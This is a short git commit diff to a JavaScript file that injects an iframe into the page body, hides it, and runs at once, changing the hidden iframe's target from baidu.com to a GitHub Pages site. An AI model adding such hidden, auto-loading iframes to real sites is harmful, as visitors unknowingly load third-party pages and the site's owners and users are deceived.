261e65ed06da61f38cae6c32c13a4dff487e4275
Venn <36472129+MuoDoo@users.noreply.github.com>
2019-01-19 22:08:33 +0800

    Update a.js

--- a.js
+++ a.js
@@ -1,5 +1,5 @@
 function fuck() {
-			document.getElementsByTagName(`body`)[0].appendChild(document.createElement(`iframe`)).src = 'http://baidu.com';
+			document.getElementsByTagName(`body`)[0].appendChild(document.createElement(`iframe`)).src = 'https://muodoo.github.io/ciweimao/';
 			document.getElementsByTagName(`iframe`)[0].style.display = "none";
 		}
 		fuck();
